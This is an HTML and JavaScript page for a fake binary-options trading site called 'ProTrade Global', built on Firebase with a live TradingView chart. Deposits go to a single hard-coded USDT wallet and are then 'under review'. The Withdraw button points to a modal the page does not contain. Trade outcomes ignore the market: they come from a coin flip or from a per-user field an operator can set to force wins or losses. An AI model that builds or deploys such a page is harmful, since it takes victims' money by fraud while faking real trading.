<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ProTrade Global | Elite Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background: #05070a; color: #e2e8f0; font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; height: 100dvh; margin: 0; }
        .glass-card { background: rgba(17, 24, 39, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.05); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
        .auth-input { background: #1a1f29; border: 1px solid #2d3748; padding: 14px; border-radius: 12px; width: 100%; color: white; outline: none; font-weight: 600; }
        .btn-grad-green { background: linear-gradient(135deg, #22c55e 0%, #15803d 100%); }
        .btn-grad-red { background: linear-gradient(135deg, #ef4444 0%, #b91c1c 100%); }
        .receipt-line { border-bottom: 1px dashed rgba(255,255,255,0.1); margin: 12px 0; }
        #appTerminal { display: none; height: 100dvh; flex-direction: column; padding: 10px; }
        #authScreen { display: flex; height: 100dvh; align-items: center; justify-content: center; padding: 20px; background: radial-gradient(circle at top right, #1e293b, #05070a); }
        .timer-badge { position: absolute; bottom: 15px; right: 15px; background: #eab308; color: black; padding: 6px 18px; border-radius: 50px; font-weight: 800; display: none; z-index: 100; font-size: 13px; }
    </style>
</head>
<body>

    <div id="authScreen">
        <div class="glass-card p-8 rounded-[40px] w-full max-w-md border border-white/10 shadow-2xl">
            <h2 class="text-3xl font-black text-center mb-2 italic">PRO<span class="text-yellow-500">TRADE</span></h2>
            <p class="text-center text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-8">Institutional Trading Portal</p>
            
            <div class="space-y-4">
                <input type="email" id="authEmail" placeholder="Email Address" class="auth-input">
                <input type="password" id="authPass" placeholder="Security Password" class="auth-input">
                <div class="grid grid-cols-2 gap-3 mt-6">
                    <button onclick="handleAuth('login')" class="py-4 bg-white text-black font-black rounded-2xl uppercase text-xs">Login</button>
                    <button onclick="handleAuth('signup')" class="py-4 bg-yellow-500 text-black font-black rounded-2xl uppercase text-xs">Join Now</button>
                </div>
            </div>
        </div>
    </div>

    <div id="appTerminal">
        <header class="flex justify-between items-center mb-3 px-1">
            <div class="flex items-center gap-3">
                <div onclick="showM('settingsM')" class="w-10 h-10 rounded-full bg-yellow-500 flex items-center justify-center text-black font-extrabold cursor-pointer shadow-lg shadow-yellow-500/20"><i class="fa-solid fa-user-tie"></i></div>
                <div>
                    <p class="text-[8px] text-gray-500 font-black uppercase tracking-widest">Available Balance</p>
                    <h1 id="balanceDisp" class="text-xl font-black text-white">$0.00</h1>
                </div>
            </div>
            <div class="flex gap-2">
                <button onclick="showM('depM')" class="bg-yellow-500 text-black px-5 py-2.5 rounded-2xl text-[10px] font-black uppercase shadow-lg shadow-yellow-500/10">Deposit</button>
                <button onclick="showM('witM')" class="bg-white/5 text-white px-5 py-2.5 rounded-2xl text-[10px] font-black uppercase border border-white/10">Withdraw</button>
            </div>
        </header>

        <div class="mb-3">
            <select id="assetSelect" onchange="loadChart(this.value)" class="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-yellow-500 font-black text-xs outline-none appearance-none">
                <option value="BINANCE:BTCUSDT">BITCOIN / USDT (92% Payout)</option>
                <option value="BINANCE:ETHUSDT">ETHEREUM / USDT (88% Payout)</option>
                <option value="FX:EURUSD">EUR / USD (82% Payout)</option>
                <option value="OANDA:XAUUSD">GOLD / USD (85% Payout)</option>
            </select>
        </div>

        <main class="relative flex-grow rounded-[35px] overflow-hidden bg-black mb-3 border border-white/5 shadow-inner">
            <div id="tv_chart" class="h-full w-full"></div>
            <div id="tradeTimer" class="timer-badge"><i class="fa-solid fa-bolt-lightning mr-1"></i> <span id="timerText">00:00</span></div>
        </main>

        <footer class="glass-card p-5 rounded-[40px] border border-white/10">
            <div class="grid grid-cols-2 gap-4 mb-5">
                <div class="bg-black/40 p-3 rounded-2xl border border-white/5">
                    <span class="text-[9px] text-gray-500 font-black uppercase mb-1 block">Trade Amount</span>
                    <input id="tradeAmt" type="number" value="100" class="bg-transparent outline-none font-black text-white text-xl w-full">
                </div>
                <div class="bg-black/40 p-3 rounded-2xl border border-white/5">
                    <span class="text-[9px] text-gray-500 font-black uppercase mb-1 block">Duration</span>
                    <select id="duration" class="bg-transparent font-black text-white text-xl w-full outline-none">
                        <option value="30">30s</option>
                        <option value="60">1m</option>
                        <option value="300">5m</option>
                    </select>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="initTrade('UP')" class="btn-grad-green h-16 rounded-3xl font-black text-white uppercase text-sm shadow-xl shadow-green-900/20 active:scale-95">Call</button>
                <button onclick="initTrade('DOWN')" class="btn-grad-red h-16 rounded-3xl font-black text-white uppercase text-sm shadow-xl shadow-red-900/20 active:scale-95">Put</button>
            </div>
        </footer>
    </div>

    <div id="statusM" class="modal">
        <div class="glass-card p-8 rounded-[40px] w-full max-w-xs text-center border border-white/10">
            <div id="statusIcon" class="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6"></div>
            <h2 id="statusTitle" class="text-2xl font-black mb-2 uppercase italic"></h2>
            <p id="statusDesc" class="text-gray-400 text-[11px] font-bold mb-8 uppercase"></p>
            <button onclick="hideM('statusM')" class="w-full py-4 bg-white/10 rounded-2xl font-black uppercase text-[10px]">Continue</button>
        </div>
    </div>

    <div id="receiptM" class="modal">
        <div class="glass-card p-8 rounded-[40px] w-full max-w-sm relative overflow-hidden border border-white/10">
            <div class="absolute top-0 left-0 w-full h-2 bg-yellow-500"></div>
            <h2 class="text-center font-black text-xl italic uppercase mb-6">Request Acknowledged</h2>
            <div class="space-y-4">
                <div class="flex justify-between items-center"><span class="text-gray-500 text-[10px] font-black uppercase">Operation</span><span id="recType" class="font-black text-[11px] text-yellow-500 uppercase"></span></div>
                <div class="receipt-line"></div>
                <div class="flex justify-between items-center"><span class="text-gray-500 text-[10px] font-black uppercase">Net Amount</span><span id="recAmt" class="font-black text-2xl text-white"></span></div>
                <div class="flex justify-between items-center"><span class="text-gray-500 text-[10px] font-black uppercase">Status</span><span class="bg-blue-500/20 text-blue-400 px-3 py-1 rounded-full text-[9px] font-black uppercase tracking-tighter">Under Review</span></div>
            </div>
            <button onclick="hideM('receiptM')" class="w-full py-4 mt-8 bg-yellow-500 text-black font-black rounded-2xl uppercase text-[10px]">Got It</button>
        </div>
    </div>

    <div id="depM" class="modal">
        <div class="glass-card p-8 rounded-[40px] w-full max-w-sm text-center border border-white/10">
            <div id="dStep1">
                <h2 class="text-2xl font-black text-yellow-500 mb-6 uppercase italic">Deposit Funds</h2>
                <input type="number" id="depAmtInput" placeholder="Amount ($)" class="auth-input mb-6 text-center text-2xl">
                <button onclick="toDStep(2)" class="w-full py-5 bg-yellow-500 text-black font-black rounded-3xl uppercase text-xs">Generate QR</button>
            </div>
            <div id="dStep2" class="hidden text-center">
                <div class="bg-white p-2 rounded-3xl w-44 h-44 mx-auto mb-6 shadow-2xl"><img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM" class="w-full"></div>
                <p class="text-[10px] text-gray-500 mb-2 font-black">USDT TRC20 (ONLY)</p>
                <div onclick="copyW()" class="bg-black/40 p-4 rounded-2xl mb-6 border border-white/10 cursor-pointer active:bg-white/5"><span class="text-[9px] font-mono block truncate">TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM</span></div>
                <button onclick="toDStep(3)" class="w-full py-5 bg-yellow-500 text-black font-black rounded-3xl uppercase text-xs">Verify Payment</button>
            </div>
            <div id="dStep3" class="hidden space-y-3">
                <input type="text" id="depTg" placeholder="Telegram ID" class="auth-input">
                <input type="text" id="depTx" placeholder="Transaction ID (TXID)" class="auth-input">
                <button onclick="submitFinalDep()" class="w-full py-5 bg-blue-600 text-white font-black rounded-3xl uppercase text-xs shadow-lg mt-4">Confirm Submission</button>
            </div>
            <button onclick="hideM('depM')" class="mt-6 text-gray-600 text-[10px] font-black uppercase">Cancel</button>
        </div>
    </div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAySRA1YSpTpmC8WjnKmDhnNMHkEmkeP50", 
            authDomain: "waqas-47f30.firebaseapp.com", 
            projectId: "waqas-47f30", 
            storageBucket: "waqas-47f30.appspot.com", 
            messagingSenderId: "374104279093", 
            appId: "1:374104279093:web:6e1844b60456c700940364" 
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth(), db = firebase.firestore();
        let userData = null;

        // Auth Logic
        auth.onAuthStateChanged(user => {
            if (user) {
                document.getElementById('authScreen').style.display = 'none';
                document.getElementById('appTerminal').style.display = 'flex';
                syncData(user.uid);
                loadChart("BINANCE:BTCUSDT");
            } else {
                document.getElementById('authScreen').style.display = 'flex';
                document.getElementById('appTerminal').style.display = 'none';
            }
        });

        async function handleAuth(mode) {
            const e = document.getElementById('authEmail').value, p = document.getElementById('authPass').value;
            if(!e || !p) return showAlert("Empty Fields", "Enter both email and password.", "error");
            try {
                if(mode === 'signup') {
                    const res = await auth.createUserWithEmailAndPassword(e, p);
                    await db.collection('users').doc(res.user.uid).set({ email: e, balance: 0, status: 'active', tradeMode: 'normal' });
                } else {
                    await auth.signInWithEmailAndPassword(e, p);
                }
            } catch(err) { showAlert("Auth Error", err.message, "error"); }
        }

        function syncData(uid) {
            db.collection('users').doc(uid).onSnapshot(doc => {
                userData = doc.data();
                if(userData.status === 'blocked') { auth.signOut(); return; }
                document.getElementById('balanceDisp').innerText = "$" + userData.balance.toFixed(2);
                document.getElementById('userInitial').innerText = userData.email[0].toUpperCase();
            });
        }

        function loadChart(symbol) {
            new TradingView.widget({
                "autosize": true, "symbol": symbol, "interval": "1", "timezone": "Etc/UTC",
                "theme": "dark", "style": "1", "locale": "en", "toolbar_bg": "#f1f3f6",
                "enable_publishing": false, "hide_top_toolbar": true, "save_image": false,
                "container_id": "tv_chart", "backgroundColor": "#05070a", "gridColor": "rgba(0,0,0,0)"
            });
        }

        function showM(id) { document.getElementById(id).style.display = 'flex'; }
        function hideM(id) { document.getElementById(id).style.display = 'none'; if(id==='depM') toDStep(1); }
        function toDStep(s) { ['dStep1','dStep2','dStep3'].forEach(d => document.getElementById(d).classList.add('hidden')); document.getElementById('dStep'+s).classList.remove('hidden'); }
        function copyW() { navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); showAlert("Copied", "Wallet address copied!", "info"); }

        function showAlert(title, desc, type) {
            const icon = document.getElementById('statusIcon');
            document.getElementById('statusTitle').innerText = title;
            document.getElementById('statusDesc').innerText = desc;
            if(type === 'error') {
                icon.innerHTML = '<i class="fa-solid fa-circle-xmark text-4xl"></i>';
                icon.className = "w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 bg-red-500/20 text-red-500";
            } else {
                icon.innerHTML = '<i class="fa-solid fa-circle-check text-4xl"></i>';
                icon.className = "w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 bg-green-500/20 text-green-500";
            }
            showM('statusM');
        }

        async function submitFinalDep() {
            const tx = document.getElementById('depTx').value, tg = document.getElementById('depTg').value, amt = document.getElementById('depAmtInput').value;
            if(!tx || !tg) return showAlert("Error", "All details are required.", "error");
            await db.collection('requests').add({ uid: auth.currentUser.uid, email: auth.currentUser.email, txid: tx, telegram: tg, amount: parseFloat(amt), time: Date.now() });
            hideM('depM');
            document.getElementById('recType').innerText = "Deposit";
            document.getElementById('recAmt').innerText = "$" + amt;
            showM('receiptM');
        }

        async function initTrade(dir) {
            const amt = parseFloat(document.getElementById('tradeAmt').value);
            const dur = parseInt(document.getElementById('duration').value);
            if(amt > userData.balance || amt < 1) return showAlert("Funds Required", "Insufficient balance to open trade.", "error");
            
            await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-amt) });
            
            let timeLeft = dur;
            const timerBadge = document.getElementById('tradeTimer');
            timerBadge.style.display = 'block';
            
            const interval = setInterval(() => {
                const m = Math.floor(timeLeft / 60), s = timeLeft % 60;
                document.getElementById('timerText').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
                if(timeLeft <= 0) {
                    clearInterval(interval);
                    timerBadge.style.display = 'none';
                    processResult(amt);
                }
                timeLeft--;
            }, 1000);
        }

        async function processResult(amt) {
            const mode = userData.tradeMode || 'normal';
            let win = mode === 'profit' ? true : (mode === 'loss' ? false : Math.random() > 0.5);
            if(win) {
                const winAmt = amt * 1.85;
                await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(winAmt) });
                showAlert("Trade Win", `You earned +$${winAmt.toFixed(2)} profit!`, "info");
            } else {
                showAlert("Trade Loss", `You lost $${amt.toFixed(2)}. Better luck next time.`, "error");
            }
        }
    </script>
</body>
</html>
